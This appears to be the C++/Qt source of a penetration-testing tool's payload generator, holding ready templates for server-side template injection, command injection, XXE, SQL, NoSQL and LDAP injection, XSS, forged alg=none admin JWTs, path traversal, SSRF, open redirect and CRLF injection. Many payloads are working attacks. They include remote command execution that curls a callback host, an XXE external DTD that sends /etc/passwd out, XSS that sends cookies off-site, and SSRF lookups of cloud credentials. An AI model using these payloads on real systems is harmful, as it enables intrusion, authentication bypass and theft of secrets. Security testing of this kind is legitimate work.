#include "payload_forge.hpp"

#include <QByteArray>

namespace Nullock::Core::PayloadForge {
namespace {

// Substitute the two template placeholders. %OAST% / %MARKER% are chosen so they
// never collide with template-engine {{ }} / ${ } syntax or url-encoded %0a
// sequences that appear literally in the payloads.
QString sub(QString t, const QString &oast, const QString &marker) {
    t.replace(QStringLiteral("%OAST%"), oast);
    t.replace(QStringLiteral("%MARKER%"), marker);
    return t;
}

QString b64url(const QByteArray &in) {
    return QString::fromLatin1(
        in.toBase64(QByteArray::Base64UrlEncoding | QByteArray::OmitTrailingEquals));
}

// A payload template. `oob` marks a payload that calls back to the OAST domain;
// such rows are skipped when no domain is available.
struct Tmpl { const char *variant; const char *tmpl; const char *note; bool oob; };

void emitAll(QList<Payload> &out, const QString &tech, const Tmpl *rows, int n,
             const ForgeParams &p) {
    const QString marker = p.marker.isEmpty() ? QStringLiteral("NULLOCK") : p.marker;
    for (int i = 0; i < n; ++i) {
        if (rows[i].oob && p.oastDomain.isEmpty())
            continue;                       // no callback host -> nothing to prove
        Payload pl;
        pl.technique = tech;
        pl.variant   = QString::fromUtf8(rows[i].variant);
        pl.payload   = sub(QString::fromUtf8(rows[i].tmpl), p.oastDomain, marker);
        pl.note      = sub(QString::fromUtf8(rows[i].note), p.oastDomain, marker);
        pl.oob       = rows[i].oob;
        out.append(pl);
    }
}

// ---- Server-Side Template Injection -------------------------------------
const Tmpl kSsti[] = {
    {"Jinja2 detect", R"PL({{7*7}})PL",
     "Renders 49 if Jinja2/Nunjucks evaluates it.", false},
    {"Jinja2 RCE (OOB)",
     R"PL({{cycler.__init__.__globals__.os.popen('curl http://%OAST%/j').read()}})PL",
     "Confirms code execution: watch OAST for a hit on /j.", true},
    {"Twig detect", R"PL({{7*7}})PL", "Renders 49 under Twig.", false},
    {"Twig RCE (OOB)", R"PL({{['curl http://%OAST%/t']|filter('system')}})PL",
     "Twig filter->system; watch OAST /t.", true},
    {"Freemarker/Velocity detect", R"PL(${7*7})PL",
     "Renders 49 under Freemarker or Velocity.", false},
    {"Freemarker RCE (OOB)",
     R"PL(<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://%OAST%/f")})PL",
     "Freemarker Execute; watch OAST /f.", true},
    {"Velocity RCE (OOB)",
     R"PL(#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"curl http://%OAST%/v"))PL",
     "Velocity reflection RCE; watch OAST /v.", true},
    {"Smarty detect", R"PL({7*7})PL", "Renders 49 under Smarty.", false},
    {"Smarty RCE (OOB)", R"PL({system('curl http://%OAST%/s')})PL",
     "Smarty {system}; watch OAST /s.", true},
    {"Mako RCE (OOB)", R"PL(<%import os%>${os.popen('curl http://%OAST%/m').read()})PL",
     "Mako import os; watch OAST /m.", true},
    {"ERB detect", R"PL(<%= 7*7 %>)PL", "Renders 49 under ERB (Ruby).", false},
    {"ERB RCE (OOB)", R"PL(<%= system('curl http://%OAST%/e') %>)PL",
     "ERB system(); watch OAST /e.", true},
};

// ---- OS command injection -----------------------------------------------
const Tmpl kCmdi[] = {
    {"nix time-blind", R"PL(; sleep 5)PL",
     "~5s delay confirms *nix command injection (no OOB needed).", false},
    {"windows time-blind", R"PL(& timeout /t 5)PL",
     "~5s delay confirms Windows command injection.", false},
    {"echo marker", R"PL(; echo %MARKER%)PL",
     "Reflected %MARKER% confirms output-visible injection.", false},
    {"semicolon curl (OOB)", R"PL(; curl http://%OAST%/c)PL", "Watch OAST /c.", true},
    {"pipe curl (OOB)", R"PL(| curl http://%OAST%/c)PL", "Watch OAST /c.", true},
    {"subshell curl (OOB)", R"PL($(curl http://%OAST%/c))PL", "Watch OAST /c.", true},
    {"backtick curl (OOB)", R"PL(`curl http://%OAST%/c`)PL", "Watch OAST /c.", true},
    {"newline curl (OOB)", R"PL(%0acurl http://%OAST%/c)PL",
     "URL-encoded LF then curl; watch OAST /c.", true},
    {"windows nslookup (OOB)", R"PL(& nslookup %OAST%)PL",
     "DNS OOB on Windows; watch the OAST DNS log.", true},
    {"nix nslookup (OOB)", R"PL(; nslookup %OAST%)PL",
     "DNS OOB; watch the OAST DNS log.", true},
};

// ---- XML External Entity -------------------------------------------------
const Tmpl kXxe[] = {
    {"file read /etc/passwd",
     R"PL(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>)PL",
     "Response echoes the file if external entities resolve.", false},
    {"file read win.ini",
     R"PL(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>)PL",
     "Windows target file-read.", false},
    {"SSRF via SYSTEM (OOB)",
     R"PL(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://%OAST%/ssrf">]><r>&x;</r>)PL",
     "Parser fetches the URL; watch OAST /ssrf.", true},
    {"blind OOB external DTD",
     R"PL(<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://%OAST%/x.dtd"> %ext;]><r>&exfil;</r>)PL",
     R"PL(Host at http://%OAST%/x.dtd: <!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%OAST%/?d=%f;'>">%e;%exfil;)PL",
     true},
};

// ---- SQL injection (never OOB: time / union / error based) ---------------
const Tmpl kSqli[] = {
    {"error probe", R"PL(')PL", "A DB error or changed response signals injectable.", false},
    {"boolean true", R"PL(' OR '1'='1' -- -)PL", "Compare with the false variant.", false},
    {"boolean false", R"PL(' OR '1'='2' -- -)PL", "Differs from true when injectable.", false},
    {"MySQL time-blind", R"PL(1' AND SLEEP(5)-- -)PL", "~5s delay = MySQL/MariaDB.", false},
    {"Postgres time-blind", R"PL(1' AND (SELECT 1 FROM pg_sleep(5))-- -)PL",
     "~5s delay = PostgreSQL.", false},
    {"MSSQL time-blind", R"PL(1'; WAITFOR DELAY '0:0:5'-- -)PL", "~5s delay = SQL Server.", false},
    {"Oracle time-blind", R"PL(1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -)PL",
     "~5s delay = Oracle.", false},
    {"UNION column count", R"PL(' ORDER BY 5-- -)PL",
     "Decrement until no error to find the column count.", false},
    {"UNION MySQL/MSSQL version", R"PL(' UNION SELECT @@version,NULL-- -)PL",
     "Match NULLs to the column count.", false},
    {"UNION Postgres version", R"PL(' UNION SELECT version(),NULL-- -)PL",
     "PostgreSQL banner.", false},
    {"UNION Oracle version", R"PL(' UNION SELECT banner,NULL FROM v$version-- -)PL",
     "Oracle banner.", false},
};

// ---- Reflected XSS -------------------------------------------------------
const Tmpl kXss[] = {
    {"HTML img/onerror", R"PL(<img src=x onerror=alert('%MARKER%')>)PL",
     "Fires if reflected into HTML body unescaped.", false},
    {"attribute breakout", R"PL("><svg onload=alert('%MARKER%')>)PL",
     "Breaks out of a double-quoted attribute.", false},
    {"single-quote attribute", R"PL(' autofocus onfocus=alert('%MARKER%') x=')PL",
     "Breaks out of a single-quoted attribute.", false},
    {"JS string breakout", R"PL(';alert('%MARKER%')//)PL",
     "For reflection inside a single-quoted JS string.", false},
    {"JS escaped-quote bypass", R"PL(\';alert('%MARKER%')//)PL",
     "When the app backslash-escapes the quote.", false},
    {"cookie exfil (OOB)",
     R"PL(<script>new Image().src='//%OAST%/x?c='+encodeURIComponent(document.cookie)</script>)PL",
     "Sends document.cookie to OAST /x (read it from the query).", true},
};

// ---- Path traversal / LFI -----------------------------------------------
const Tmpl kLfi[] = {
    {"classic ../ (nix)", R"PL(../../../../etc/passwd)PL",
     "Reads /etc/passwd if the path is used unsanitized.", false},
    {"windows ..\\", R"PL(..\..\..\..\windows\win.ini)PL", "Windows target.", false},
    {"url-encoded", R"PL(..%2f..%2f..%2f..%2fetc%2fpasswd)PL",
     "For filters that only block literal ../.", false},
    {"nested-clobber bypass", R"PL(....//....//....//etc/passwd)PL",
     "Survives a single non-recursive ../ strip.", false},
    {"php filter (source disclosure)",
     R"PL(php://filter/convert.base64-encode/resource=index.php)PL",
     "Returns the base64 of the source in PHP apps.", false},
    {"proc self environ", R"PL(/proc/self/environ)PL",
     "Env vars (and a log-poisoning RCE primitive) on Linux.", false},
};

// ---- SSRF ---------------------------------------------------------------
const Tmpl kSsrf[] = {
    {"AWS IMDSv1", R"PL(http://169.254.169.254/latest/meta-data/)PL",
     "Cloud metadata; drill into iam/security-credentials/ for keys.", false},
    {"GCP metadata", R"PL(http://metadata.google.internal/computeMetadata/v1/)PL",
     "Needs header Metadata-Flavor: Google.", false},
    {"localhost", R"PL(http://127.0.0.1:80/)PL", "Hits an internal service.", false},
    {"decimal-IP bypass", R"PL(http://2130706433/)PL",
     "2130706433 == 127.0.0.1; slips host allow-lists.", false},
    {"octal-IP bypass", R"PL(http://0177.0.0.1/)PL", "Octal 127.0.0.1.", false},
    {"OOB confirm", R"PL(http://%OAST%/ssrf)PL",
     "Blind SSRF confirmation; watch OAST /ssrf.", true},
};

// ---- Open redirect ------------------------------------------------------
const Tmpl kRedir[] = {
    {"scheme-relative", R"PL(//evil.example/)PL", "Redirects off-site if honored.", false},
    {"backslash trick", R"PL(/\evil.example/)PL", "Browsers treat /\\ as //.", false},
    {"whitelist-host prefix", R"PL(https://trusted.example.evil.example/)PL",
     "Beats naive startsWith('trusted.example') checks.", false},
    {"at-sign userinfo", R"PL(https://trusted.example@evil.example/)PL",
     "Everything before @ is userinfo; host is evil.example.", false},
    {"OOB redirect", R"PL(//%OAST%/)PL", "Watch OAST for the redirected hit.", true},
};

// ---- NoSQL injection ----------------------------------------------------
const Tmpl kNosql[] = {
    {"operator auth bypass (JSON)", R"PL({"username":{"$ne":null},"password":{"$ne":null}})PL",
     "Logs in as the first user when the body is JSON.", false},
    {"operator in query string", R"PL(username[$ne]=&password[$ne]=)PL",
     "Same bypass via bracketed query params.", false},
    {"$gt empty", R"PL({"password":{"$gt":""}})PL", "Truthy for any password.", false},
    {"$regex match-all", R"PL({"username":{"$regex":".*"}})PL", "Matches any user.", false},
    {"JS injection ($where)", R"PL(';return true;var x=')PL",
     "For $where / server-side JS evaluation.", false},
};

// ---- LDAP injection -----------------------------------------------------
const Tmpl kLdap[] = {
    {"wildcard", R"PL(*)PL", "Returns all entries if injected into a filter.", false},
    {"auth bypass", R"PL(*)(uid=*))(|(uid=*)PL", "Classic filter-breakout bypass.", false},
    {"always-true", R"PL(*)(|(objectClass=*))PL", "Appends an always-true clause.", false},
    {"password-attr probe", R"PL(*)(|(password=*))PL", "Tests for a readable password attr.", false},
};

// ---- CRLF / HTTP response splitting -------------------------------------
const Tmpl kCrlf[] = {
    {"cookie inject", R"PL(%0d%0aSet-Cookie:%20nl_inject=1)PL",
     "A reflected Set-Cookie confirms header injection.", false},
    {"unicode-CRLF bypass", R"PL(%E5%98%8D%E5%98%8ASet-Cookie:%20nl=1)PL",
     "Overlong-UTF8 CR/LF that some stacks normalize.", false},
    {"response split -> XSS", R"PL(%0d%0a%0d%0a<script>alert('%MARKER%')</script>)PL",
     "Splits the response and injects a body.", false},
    {"open-redirect via CRLF (OOB)", R"PL(%0d%0aLocation:%20http://%OAST%/)PL",
     "Injected Location header; watch OAST.", true},
};

template <int N> int count(const Tmpl (&)[N]) { return N; }

QList<Payload> forgeJwt(const ForgeParams &p) {
    const QString marker = p.marker.isEmpty() ? QStringLiteral("NULLOCK") : p.marker;
    QList<Payload> out;
    // alg=none with case variants that slip past naive "== none" filters.
    for (const QString &alg : { QStringLiteral("none"), QStringLiteral("None"),
                                QStringLiteral("nOnE") }) {
        const QByteArray hdr =
            QStringLiteral(R"({"alg":"%1","typ":"JWT"})").arg(alg).toUtf8();
        const QByteArray claims =
            QStringLiteral(R"({"sub":"admin","role":"admin","canary":"%1"})")
                .arg(marker).toUtf8();
        Payload pl;
        pl.technique = QStringLiteral("jwt");
        pl.variant   = QStringLiteral("alg=%1 forged (admin)").arg(alg);
        pl.payload   = b64url(hdr) + QLatin1Char('.') + b64url(claims) + QLatin1Char('.');
        pl.note      = QStringLiteral("Unsigned token; accepted if the server honors "
                                      "alg=none. Edit the claims to taste.");
        pl.oob       = false;
        out.append(pl);
    }
    return out;
}

} // namespace

QStringList techniques() {
    return { QStringLiteral("ssti"), QStringLiteral("cmdi"), QStringLiteral("xxe"),
             QStringLiteral("sqli"), QStringLiteral("xss"),  QStringLiteral("jwt"),
             QStringLiteral("lfi"),  QStringLiteral("ssrf"), QStringLiteral("redirect"),
             QStringLiteral("nosqli"), QStringLiteral("ldap"), QStringLiteral("crlf") };
}

QList<Payload> forge(const QString &technique, const ForgeParams &params) {
    const QString t = technique.trimmed().toLower();
    const bool all = t.isEmpty() || t == QLatin1String("all");
    auto want = [&](const char *name) { return all || t == QLatin1String(name); };

    QList<Payload> out;
    if (want("ssti")) emitAll(out, QStringLiteral("ssti"), kSsti, count(kSsti), params);
    if (want("cmdi")) emitAll(out, QStringLiteral("cmdi"), kCmdi, count(kCmdi), params);
    if (want("xxe"))  emitAll(out, QStringLiteral("xxe"),  kXxe,  count(kXxe),  params);
    if (want("sqli")) emitAll(out, QStringLiteral("sqli"), kSqli, count(kSqli), params);
    if (want("xss"))  emitAll(out, QStringLiteral("xss"),  kXss,  count(kXss),  params);
    if (want("jwt"))  out.append(forgeJwt(params));
    if (want("lfi"))      emitAll(out, QStringLiteral("lfi"),      kLfi,   count(kLfi),   params);
    if (want("ssrf"))     emitAll(out, QStringLiteral("ssrf"),     kSsrf,  count(kSsrf),  params);
    if (want("redirect")) emitAll(out, QStringLiteral("redirect"), kRedir, count(kRedir), params);
    if (want("nosqli"))   emitAll(out, QStringLiteral("nosqli"),   kNosql, count(kNosql), params);
    if (want("ldap"))     emitAll(out, QStringLiteral("ldap"),     kLdap,  count(kLdap),  params);
    if (want("crlf"))     emitAll(out, QStringLiteral("crlf"),     kCrlf,  count(kCrlf),  params);
    return out;
}

} // namespace Nullock::Core::PayloadForge
